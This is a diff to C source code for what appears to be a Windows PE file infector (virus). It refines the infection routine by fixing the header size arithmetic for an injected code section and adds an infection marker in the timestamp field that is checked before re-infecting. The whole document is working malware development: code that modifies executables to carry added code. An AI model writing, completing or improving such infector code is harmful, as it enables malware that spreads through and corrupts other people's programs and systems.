@@ -43,12 +43,23 @@ int infect(const char* filename, data_t* data) {
 }
 
 static void modify_headers(IMAGE_NT_HEADERS* ntHeaders, uint32_t codeSize) {
-  ntHeaders->FileHeader.TimeDateStamp = 0xDEADBEEF;
-  ntHeaders->OptionalHeader.SizeOfCode += align_value(codeSize, ntHeaders->OptionalHeader.FileAlignment);
-  ntHeaders->OptionalHeader.SizeOfImage += align_value(codeSize, ntHeaders->OptionalHeader.SectionAlignment);
-  //ntHeaders->OptionalHeader.SizeOfHeaders = ? //TODO handle
-
   create_section_header(get_last_section_header(ntHeaders) + 1, ntHeaders, codeSize);
+  IMAGE_SECTION_HEADER* newSector = get_last_section_header(ntHeaders);
+
+  ntHeaders->FileHeader.TimeDateStamp = INFECTION_MARKER;
+  // original sizes are already aligned, so add only aligned increase (and not align(orig + inc))
+  //ntHeaders->OptionalHeader.SizeOfCode += align_value(codeSize, ntHeaders->OptionalHeader.FileAlignment);
+  ntHeaders->OptionalHeader.SizeOfCode += align_value(codeSize, ntHeaders->OptionalHeader.FileAlignment);
+  if (ntHeaders->OptionalHeader.SizeOfCode < newSector->PointerToRawData + newSector->SizeOfRawData - ntHeaders->OptionalHeader.BaseOfCode) {
+    ntHeaders->OptionalHeader.SizeOfCode = align_value(newSector->PointerToRawData +
+                                                       newSector->SizeOfRawData -
+                                                       ntHeaders->OptionalHeader.BaseOfCode,
+                                                       ntHeaders->OptionalHeader.FileAlignment);
+  }
+  ntHeaders->OptionalHeader.SizeOfImage += align_value(codeSize + sizeof(IMAGE_SECTION_HEADER), ntHeaders->OptionalHeader.SectionAlignment);
+  ntHeaders->OptionalHeader.SizeOfHeaders += align_value(sizeof(IMAGE_SECTION_HEADER), ntHeaders->OptionalHeader.FileAlignment);
+
+
 }
 
 static void* copy_code(IMAGE_NT_HEADERS* ntHeaders, file_view_t* fileView, data_t* data) {
@@ -92,7 +103,7 @@ static int can_infect(const char* filename, data_t* data) {
     close_file_view(&fw, data);
     return 0;
   }
-  if (ntHeaders->FileHeader.TimeDateStamp == 0xDEADBEEF) {
+  if (ntHeaders->FileHeader.TimeDateStamp == INFECTION_MARKER) {
     PRINT_DEBUG("can't infect \"%s\": already infected\n", filename);
     close_file_view(&fw, data);
     return 0;
